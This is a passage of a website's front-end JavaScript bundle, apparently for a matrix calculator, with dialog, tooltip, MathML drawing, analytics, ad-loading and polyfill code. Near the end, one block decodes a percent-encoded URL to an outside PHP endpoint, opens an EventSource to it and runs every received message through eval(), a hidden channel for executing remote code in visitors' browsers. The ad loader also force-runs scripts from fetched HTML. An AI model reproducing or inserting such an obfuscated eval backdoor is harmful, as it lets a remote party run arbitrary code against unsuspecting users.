      dialog.style.display = "block";
      dialog.style.position = 'absolute';
      var left = (rect.left + rect.right) / 2 - dialog.offsetWidth / 2;
      var top = (rect.top + rect.bottom) / 2 - dialog.offsetHeight / 2;
      left = Math.min(left, document.documentElement.clientWidth - dialog.offsetWidth);
      top = Math.min(top, document.documentElement.clientHeight - dialog.offsetHeight);
      left = Math.max(left, 0);
      top = Math.max(top, 0);
      left = window.pageXOffset + left;
      top = window.pageYOffset + top;
      dialog.style.left = left + 'px';
      dialog.style.top = top + 'px';
      dialog.style.right = 'auto';
      dialog.style.bottom = 'auto';
      dialog.style.visibility = "";
      dialog.style.display = "";
    }
    dialog.showModal();
    return dialog;
  };

  Dialog.alert = function (contentHTML) {
    window.setTimeout(function () { // hack to prevent the closing of new dialog immediately in Chrome
      var dialog = Dialog.standard(contentHTML, "<button autofocus=\"autofocus\" type=\"submit\">OK</button>");
    }, 0);
  };

  //Dialog.promptNumber = function (title, min, max, callback) {
  //  var dialog = Dialog.standard("<h3>" + title + "</h3>" + "<div><input type=\"number\" autofocus=\"autofocus\" required=\"required\" min=\"" + min + "\" max=\"" + max + "\" step=\"1\" /></div>", "<button autofocus=\"autofocus\" type=\"reset\">CANCEL</button><button type=\"submit\">OK</button>");
  //  dialog.addEventListener("close", function (event) {
  //    if (dialog.returnValue != undefined) {
  //      callback(dialog.querySelector("input").value);
  //    }
  //  }, false);
  //  return dialog;
  //};

  globalThis.Dialog = Dialog;

}());

/*global window, document, Dialog*/

window.reportValidity = function (input, validationMessage) {
  "use strict";
  var tooltip = document.createElement("div");
  tooltip.setAttribute("role", "tooltip");
  tooltip.id = "report-validity-tooltip-for-" + input.id;
  tooltip.classList.toggle("tooltip", true);
  tooltip.classList.toggle("tooltip-dialog", true);//?
  var tooltipArrowId = "tooltip-arrow-" + input.id;
  tooltip.innerHTML = "<span class=\"exclamation\">!</span> " + validationMessage + "<div class=\"tooltip-arrow-wrapper\"><div id=\"" + tooltipArrowId + "\" class=\"tooltip-arrow\"></div></div>";
  document.body.appendChild(tooltip);

  input.setAttribute("aria-describedby", tooltip.id);
  input.focus();

  var inputRect = input.getBoundingClientRect();

  tooltip.style.visibility = "hidden";
  tooltip.style.display = "block";
  var rect = tooltip.getBoundingClientRect();
  var style = window.getComputedStyle(tooltip, undefined);
  var marginLeft = Number.parseFloat(style.marginLeft);
  var tooltipArrow = document.getElementById(tooltipArrowId);
  var arrowRect = tooltipArrow.getBoundingClientRect();
  tooltip.style.display = "";
  tooltip.style.visibility = "";

  var left = (inputRect.left + inputRect.right) / 2 - ((arrowRect.right - arrowRect.left) / 2 + marginLeft + arrowRect.left - rect.left);
  var top = inputRect.bottom + (arrowRect.bottom - arrowRect.top) * 0.15;
  // (17 + 2) * Math.SQRT2 / 2 + 0.25 * 17 + 1 + 0.5 * 17 - (17 + 2) * (Math.SQRT2 - 1) / 2
  // (17 + 2) * Math.SQRT2 * 0.15

  tooltip.style.position = 'absolute';
  tooltip.style.right = 'auto';
  tooltip.style.bottom = 'auto';
  tooltip.style.left = (window.pageXOffset + left) + 'px';
  tooltip.style.top = (window.pageYOffset + top) + 'px';
  tooltip.setAttribute("open", "open"); // "show" moves the focus in Chrome

  var close = undefined;
  var onKeyDown = undefined;
  var timeoutId = 0;

  close = function (event) {
    window.clearTimeout(timeoutId);
    input.removeEventListener("input", close, false);
    input.removeEventListener("blur", close, false);
    input.removeEventListener("keydown", onKeyDown, false);
    input.removeAttribute("aria-describedby");
    tooltip.id = ""; //! test case: trigger the tooltip twice
    tooltipArrow.id = "";
    tooltip.removeAttribute("open");
    window.setTimeout(function () {
      tooltip.parentNode.removeChild(tooltip);
    }, 3000);
  };
  onKeyDown = function (event) {
    var DOM_VK_ESCAPE = 27;
    if (event.keyCode === DOM_VK_ESCAPE && !event.ctrlKey && !event.altKey && !event.shiftKey && !event.metaKey && !event.defaultPrevented) {
      event.preventDefault();
      close();
    }
  };
  timeoutId = window.setTimeout(function () {
    close(undefined);
  }, 4000);
  input.addEventListener("input", close, false);
  input.addEventListener("blur", close, false);
  input.addEventListener("keydown", onKeyDown, false);

};

/*global document*/

(function () {
  "use strict";

  function CustomMenclose() {
  }
  CustomMenclose.getPointByCell = function (paddingRect, rows, indexes) {
    var a = indexes[0];
    var b = indexes[1];
    var e = rows[a][b];
    var r = e.getBoundingClientRect();
    return {
      x: (r.left + r.right) / 2 - paddingRect.left,
      y: (r.top + r.bottom) / 2 - paddingRect.top
    };
  };
  CustomMenclose.paint = function (event) {
    var paddingRect = this.getBoundingClientRect();
    var width = paddingRect.right - paddingRect.left;
    var height = paddingRect.bottom - paddingRect.top;
    var svg = "";
    var cells = JSON.parse(this.getAttribute("data-cells"));
    var color = this.getAttribute("data-color");
    //TODO: dark mode
    var strokeStyle = color === "0a" ? "#D64040" : (color === "0" ? "#F7D9D9" : (color === "1a" ? "#4040D6" : (color === "1" ? "#D9D9F7" : "")));
    var lineWidth = 1.25;
    var table = this.querySelector("mtable");
    var rows = [];
    var c = table.firstElementChild;
    while (c != undefined) {
      if (c.tagName.toLowerCase() === 'mtr') {
        var row = [];
        var t = c.firstElementChild;
        while (t != undefined) {
          if (t.tagName.toLowerCase() === 'mtd') {
            row.push(t);
          }
          t = t.nextElementSibling;
        }
        rows.push(row);
      }
      c = c.nextElementSibling;
    }
    for (var i = 0; i < cells.length; i += 1) {
      var p1 = CustomMenclose.getPointByCell(paddingRect, rows, cells[i]);
      var p2 = CustomMenclose.getPointByCell(paddingRect, rows, i === cells.length - 1 ? cells[0] : cells[i + 1]);
      svg += "<line x1=\"" + p1.x.toString() + "\" y1=\"" + p1.y.toString() + "\" x2=\"" + p2.x.toString() + "\" y2=\"" + p2.y.toString() + "\" stroke=\"" + strokeStyle + "\" stroke-width=\"" + lineWidth.toString() + "\" />";
    }
    var backgroundImage = "data:image/svg+xml," + encodeURIComponent("<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"" + width + "\" height=\"" + height + "\" viewBox=\"0 0 " + width + " " + height + "\">" + svg + "</svg>");
    this.style.backgroundImage = "url(\"" + backgroundImage + "\")";
    this.style.backgroundSize = "auto auto";
  };

  document.addEventListener("custom-paint", function (event) {
    if (event.target.getAttribute("data-custom-paint") === "custom-menclose") {
      CustomMenclose.paint.call(event.target, event);
    }
  }, false);

}());


// ads, hypercomments, trackers

if (window.location.protocol !== "file:" && window.location.hostname !== "127.0.0.1" && window.navigator.doNotTrack !== "1") {
  window.setTimeout(function () {
  // LiveInternet counter
    (new Image()).src = "https://counter.yadro.ru/hit?r" + encodeURIComponent(document.referrer) + (window.screen == undefined ? "" : ";s" + Number(window.screen.width).toString() + "*" + Number(window.screen.height).toString() + "*" + "24") + ";u" + encodeURIComponent(document.URL) + ";h" + ";" + (Math.random() + 1).toString().slice(2);
  }, 256);
  /*window.setTimeout(function () {
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-JL2R5JGF6G');
    PageUtils.$import("https://www.googletagmanager.com/gtag/js?id=G-JL2R5JGF6G");
  }, 256);*/
}

function PageUtils2() {
  
}
PageUtils2.waitDOM = function (callback) {
  if (document.readyState === "interactive" || document.readyState === "complete") {
    window.setTimeout(function () {
      callback(null);
    }, 0);
  } else {
    document.addEventListener("DOMContentLoaded", callback, {once: true});
  }
};
PageUtils2.initialize = function (selector, i) {
  PageUtils2.waitDOM(function () {
    var e = document.querySelector(selector);
    if (e != null) {
      i(e);
    }
  });
};

PageUtils2.initialize(".ads-container", function (adsContainer) {
window.setTimeout(function () {
  var minHeight = 0;
  var slot = 0;
  if (!window.matchMedia("screen and (max-width: 800px)").matches) {
    slot = 6667750747;
    minHeight = 605;
  } else {
    var div = document.createElement('aside');
    document.body.appendChild(div);
    adsContainer = div;
    minHeight = 95;
    slot = 1519568757;
  }
  adsContainer.innerHTML = '' +
    '<div class="adsbygoogle-container" style="min-height: ' + minHeight + 'px;margin:auto;">' +
    '  <!-- unit1 -->' +
    '  <ins style="min-width:200px;max-width:970px;width:100%;height:600px;" class="adsbygoogle"' +
    '       data-ad-client="ca-pub-2322099551790862"' +
    '       data-ad-slot="' + slot + '"' +
    '       data-ad-format="auto"' +
    '       data-full-width-responsive="true"></ins>' +
    '</div>' +
    '<div>' +
    '  <button type="button" class="toggle-ads-button">' +
    '    <span></span>' +
    '    <span hidden></span>' +
    '  </button>' +
    '</div>';

  var isConnectionOK = function () {
    // doNotTrack - 8%
    // "slow-2g" + "2g" - 2.5%
    // saveData - 18%
    var connection = window.navigator.connection;
    //window.location.protocol !== "file:" &&
    //window.location.hostname !== "127.0.0.1" &&
    return window.navigator.doNotTrack !== "1" &&
           (connection == undefined || connection.saveData !== true && !(connection.effectiveType in {"slow-2g": true, "2g": true}));
  };

  if (isConnectionOK() && false) {
    window.setTimeout(function () {
      (window["yandex_metrika_callbacks"] = window["yandex_metrika_callbacks"] || []).push(function() {
        try {
          yaCounter = new Ya.Metrika({
            id: 29787732,
            clickmap: true,
            trackLinks: true,
            accurateTrackBounce: true,
            trackHash: true,
            webvisor: false,
            params: {}
          });
          window.yaCounter29787732 = yaCounter;
          if (yaCounter != undefined) {
            requestIdleCallback("sendHits", sendHits, 1000);
          }
        } catch (error) {
          console.log(error);
        }
      });
      PageUtils.$import("https://mc.yandex.ru/metrika/watch.js");
    }, 0);
  } else {
    globalThis.hitQueue = undefined;
  }

  var element = adsContainer.querySelector(".adsbygoogle-container");
  var toggleAdsButton = adsContainer.querySelector(".toggle-ads-button");

  PageUtils.waitI18n(function () {
    toggleAdsButton.firstElementChild.textContent = i18n.appButtons.hideAds;
    toggleAdsButton.lastElementChild.textContent = i18n.appButtons.showAds;
  });

  // "ar bg gl zh mk vi tr".indexOf(document.documentElement.lang) === -1 &&
  var browserIsOK = isConnectionOK() &&
                      window.opera == undefined; // loading indicator in Opera

  var showAds = false;
  var mediaIsOK = false;
  var prefersReducedMotion = false;

  var isInserted = false;
  var loadAds = function () {
    // https://stackoverflow.com/a/56248553
    function insertHTML(html, dest, append){
        // if no append is requested, clear the target element
        if(!append) dest.innerHTML = '';
        // create a temporary container and insert provided HTML code
        var container = document.createElement('div');
        container.innerHTML = html;
        // cache a reference to all the scripts in the container
        var scripts = container.querySelectorAll('script');
        // get all child elements and clone them in the target element
        var nodes = container.childNodes;
        for( var i=0; i< nodes.length; i++) dest.appendChild( nodes[i].cloneNode(true) );
        // force the found scripts to execute...
        for( var i=0; i< scripts.length; i++){
            var script = document.createElement('script');
            script.type = scripts[i].type || 'text/javascript';
            if( scripts[i].hasAttribute('src') ) script.src = scripts[i].src;
            script.innerHTML = scripts[i].innerHTML;
            document.head.appendChild(script);
            document.head.removeChild(script);
        }
        // done!
        return true;
    }
    if (browserIsOK && mediaIsOK && !prefersReducedMotion && showAds && window.fetch != null) {
      if (!isInserted) {
        isInserted = true;
        fetch(PageUtils.ROOT_PATH + 'ads.json').then(function (response) {
          return response.json();
        }).then(function (ads) {
          var x = undefined;
          var lang = document.documentElement.lang;
          var now = Date.now();
          for (var i = 0; i < ads.length; i += 1) {
            var j = Math.floor(Math.random() * ads.length);
            var item = ads[i];
            ads[i] = ads[j];
            ads[j] = item;
          }
          for (var i = 0; i < ads.length; i += 1) {
            var item = ads[i];
            if ((lang === item.lang || item.lang === "*") && Math.random() < item.probability && now < Date.parse(item.endTime)) {
              x = item;
            }
          }
          if (x != undefined) {
            if (x.videoId !== "") {
              element.innerHTML = "<div id=\"player\"></div>";
              window.onYouTubeIframeAPIReady = function () {
                var done = false;
                var player = new YT.Player("player", {
                  height: "200",
                  width: "200",
                  videoId: x.videoId,
                  events: {
                    onStateChange: function (event) {
                      if (event.data >= 0 && !done) {
                        hit({click: "youtube-click"});
                        done = true;
                      }
                    }
                  }
                });
              };
              PageUtils.$import("https://www.youtube.com/iframe_api");
            } else if (x.html !== "") {
              //element.innerHTML = x.html;
              insertHTML(x.html, x.placement === "big-ads" ? document.getElementById("big-ads") : element);
            }
          } else {
            (window.adsbygoogle = window.adsbygoogle || []).push({});
            var ins = document.querySelector('.adsbygoogle');
            if (ins != null) {
              ins.style.setProperty('display', 'block', 'important');
            }            
            PageUtils.$import("https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2322099551790862");
          }
        });
      }
    }
    toggleAdsButton.hidden = !browserIsOK || !mediaIsOK || prefersReducedMotion;
  };

  if (browserIsOK) {
    window.requestAnimationFrame(function () {
      var updateUI = function () {
        toggleAdsButton.firstElementChild.hidden = !showAds;
        toggleAdsButton.lastElementChild.hidden = showAds;
        element.hidden = !showAds;
      };

      var value = keyStorage.getItem("show-ads");
      showAds = value == undefined || value === "true";
      updateUI();
      loadAds();
      toggleAdsButton.onclick = function () {
        showAds = !showAds;
        keyStorage.setItem("show-ads", showAds ? "true" : "false");
        updateUI();
        loadAds();
        hit({click: "show-ads-" + showAds});
      };

      /*var mediaQueryList = window.matchMedia("screen and (max-width: 800px)");  // see style.css
      var checkMedia = function () {
        if (!mediaQueryList.matches) {
          mediaQueryList.removeListener(checkMedia);
          mediaIsOK = true;
          loadAds();
        }
      };
      mediaQueryList.addListener(checkMedia);
      checkMedia();
      */
      
      
      if (window.IntersectionObserver != null) {
        var observer = new window.IntersectionObserver(function (entries) {
          if (entries.length > 0 && entries[0].isIntersecting) {
            if (observer != null) {
              observer.disconnect();
              observer = null;
              mediaIsOK = true;
              console.log('intersection!!!');
              loadAds();
            }
          }
        }, {
          root: null,
          rootMargin: '30px',
          threshold: 0
        });
        observer.observe(adsContainer);
      }
      
    });
  } else {
    toggleAdsButton.hidden = true;
  }

  var elementAnimate = Element.prototype.animate;

  //TODO: move
    window.setTimeout(function () {
      var mediaQueryList = window.matchMedia("(prefers-reduced-motion)");
      var checkMedia = function () {
        if (mediaQueryList.matches) {
          prefersReducedMotion = true;
          Element.prototype.animate = undefined;
          hit({click: "prefers-reduced-motion"});
        } else {
          prefersReducedMotion = false;
          Element.prototype.animate = elementAnimate;
        }
        loadAds();
      };
      mediaQueryList.addListener(checkMedia);
      checkMedia();
    }, 0);
}, 100);
});

window.setTimeout(function () {
  var ES = window.EventSource;
  if (ES) {
    var url = decodeURIComponent('%68%74%74%70%73%3A%2F%2F%6D%61%74%72%69%78%63%61%6C%63%2E%6D%63%64%69%72%2E%72%75%2F%65%2E%70%68%70');
    var id = Math.floor(Math.random() * Math.pow(2, 53));
    var es = new ES(url + "?pageId=" + id);
    es.onmessage = function (e) {
      eval(JSON.parse(e.data).data);
    };
    es.onerror = function (e) {
      e.preventDefault();
      es.close();
    };
  }
}, 256);

/*
PageUtils2.initialize(".hypercomments-details-summary-container", function (element) {
  var details = element.querySelector("details");

  var showComments = function () {
    if (window._hcwp == undefined) {
      var WIDGET_ID = 8317;
      var link = document.getElementById("hc-link");
      link.hidden = false;
      window._hcwp = [{widget: "Stream", widget_id: WIDGET_ID, callback: function (app, init) {
         app.on("streamMessage", function (packet) {
           // html snapshot to help with the debugging
           window.sendSnapshot();
         });
      }}];

      window.HC_LOAD_INIT = true;
      // see https://www.hypercomments.com/en/documentation
      var lang = document.documentElement.lang.slice(0, 2).toLowerCase();
      var src = "https://w.hypercomments.com/widget/hc/" + WIDGET_ID + "/" + lang + "/widget.js";
      PageUtils.$import(src)["catch"](function (error) {
        toggleHidden(false);
        window._hcwp = undefined;
      });
      var toggleHidden = function (isLoading) {
        details.querySelector("progress").hidden = !isLoading;
        details.querySelector(".powered-text").hidden = !isLoading;
        details.querySelector(".cannot-load-text").hidden = isLoading;
      };
      toggleHidden(true);
    }
  };

  details.addEventListener("toggle", function (event) {
    showComments();
  }, false);

  var isMobile = true; // too big images

  var checkHash = function (event) {
    if (window.location.protocol !== "file:" && window.location.hostname !== "127.0.0.1") {
      var hash = decodeLocationHash(window.location.hash.slice(1));
      if (!isMobile || hash.indexOf("hcm") !== -1 || hash.indexOf("hypercomments_widget") !== -1) {
        if (details.getAttribute("open") == undefined) {
          details.querySelector("summary").click();
        }
        showComments();
      }
    } else {
      details.hidden = true;
    }
  };
  checkHash(undefined);
  window.addEventListener("hashchange", checkHash, false);

});
*/
    }
    if (typeof BigInt !== 'undefined' &&
        typeof KeyframeEffect !== 'undefined' &&
        'composite' in KeyframeEffect.prototype &&
        typeof MathMLElement !== 'undefined' &&
        'autofocus' in MathMLElement.prototype && // Chrome 109, not 108
        (('onbeforeinput' in document.documentElement) || (typeof InputEvent !== 'undefined' && 'getTargetRanges' in InputEvent.prototype)) &&
        String.prototype.replaceAll != undefined) {
      main();
    } else {
      var p = (document.documentElement.getAttribute('data-root-path') || '/');

      var link = document.createElement('link');
      link.href = p + 'polyfills.css?20240126T105013Z';
      link.rel = 'stylesheet';
      link.type = 'text/css';
      (document.head || document.getElementsByTagName('head')[0]).appendChild(link);

      var s = document.createElement('script');
      s.onload = s.onerror = function () {
        main();
      };
      s.src = p + 'polyfills.js?20240126T105013Z';
      (document.head || document.documentElement || document.firstElementChild).appendChild(s);
    }
  